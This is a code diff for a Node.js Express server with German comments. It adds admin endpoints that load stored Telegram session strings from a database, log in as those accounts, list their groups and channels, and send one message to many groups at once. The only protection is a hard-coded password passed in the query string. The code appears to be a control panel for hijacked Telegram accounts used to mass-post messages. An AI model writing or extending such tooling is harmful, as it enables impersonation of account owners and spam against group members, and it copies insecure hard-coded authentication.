@@ -94,3 +94,58 @@ app.get('/get-sessions', async (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
+// Dialoge abrufen
+app.post('/admin/get-dialogs', async (req, res) => {
+    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
+    const { sessionId } = req.body;
+    
+    try {
+        const dbSession = await Session.findById(sessionId);
+        if (!dbSession) return res.status(404).json({ error: "Session nicht gefunden" });
+
+        const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, { connectionRetries: 5 });
+        await client.connect();
+        
+        const dialogs = await client.getDialogs();
+        const result = dialogs.map(d => ({
+            title: d.title || "Unbekannt",
+            id: d.id.toString(),
+            isGroup: d.isGroup,
+            isChannel: d.isChannel
+        })).filter(d => d.isGroup || d.isChannel); // Nur Gruppen/Channels
+        
+        await client.disconnect();
+        res.json({ dialogs: result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Nachricht an mehrere Gruppen senden
+app.post('/admin/send-message', async (req, res) => {
+    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
+    const { sessionId, targetIds, message } = req.body;
+    
+    try {
+        const dbSession = await Session.findById(sessionId);
+        if (!dbSession) return res.status(404).json({ error: "Session nicht gefunden" });
+
+        const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, { connectionRetries: 5 });
+        await client.connect();
+        
+        const results = [];
+        for (const id of targetIds) {
+            try {
+                await client.sendMessage(id, { message });
+                results.push({ id, status: 'success' });
+            } catch (err) {
+                results.push({ id, status: 'failed', error: err.message });
+            }
+        }
+        
+        await client.disconnect();
+        res.json({ results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
